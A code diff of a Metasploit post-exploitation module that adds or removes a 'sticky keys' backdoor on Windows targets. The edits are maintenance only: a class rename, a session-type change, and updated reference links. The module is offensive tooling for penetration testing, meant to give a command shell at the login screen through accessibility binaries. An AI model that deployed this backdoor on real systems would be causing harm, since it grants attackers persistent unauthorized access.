@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit4 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::Registry
   include Msf::Post::Windows::Priv
@@ -38,14 +35,14 @@ class Metasploit4 < Msf::Post
       },
       'Author'        => ['OJ Reeves'],
       'Platform'      => ['win'],
-      'SessionTypes'  => ['meterpreter', 'cmd'],
+      'SessionTypes'  => ['meterpreter', 'shell'],
       'Actions'       => [
-        ['ADD',    {'Description' => 'Add the backdoor to the target.'}],
-        ['REMOVE', {'Description' => 'Remove the backdoor from the target.'}]
+        ['ADD',    'Description' => 'Add the backdoor to the target.'],
+        ['REMOVE', 'Description' => 'Remove the backdoor from the target.']
       ],
       'References' => [
-        ['URL', 'https://social.technet.microsoft.com/Forums/windows/en-US/a3968ec9-5824-4bc2-82a2-a37ea88c273a/sticky-keys-exploit'],
-        ['URL', 'http://carnal0wnage.attackresearch.com/2012/04/privilege-escalation-via-sticky-keys.html']
+        ['URL', 'https://web.archive.org/web/20170201184448/https://social.technet.microsoft.com/Forums/windows/en-US/a3968ec9-5824-4bc2-82a2-a37ea88c273a/sticky-keys-exploit'],
+        ['URL', 'https://blog.carnal0wnage.com/2012/04/privilege-escalation-via-sticky-keys.html']
       ],
       'DefaultAction' => 'ADD'
     ))
@@ -53,7 +50,7 @@ class Metasploit4 < Msf::Post
     register_options([
       OptEnum.new('TARGET', [true, 'The target binary to add the exploit to.', 'SETHC', ['SETHC', 'UTILMAN', 'OSK', 'DISP']]),
       OptString.new('EXE', [true, 'Executable to execute when the exploit is triggered.', '%SYSTEMROOT%\system32\cmd.exe'])
-    ], self.class)
+    ])
   end
 
   #
@@ -120,5 +117,4 @@ class Metasploit4 < Msf::Post
       print_good("'Sticky keys' removed from registry key #{target_key}.")
     end
   end
-
 end
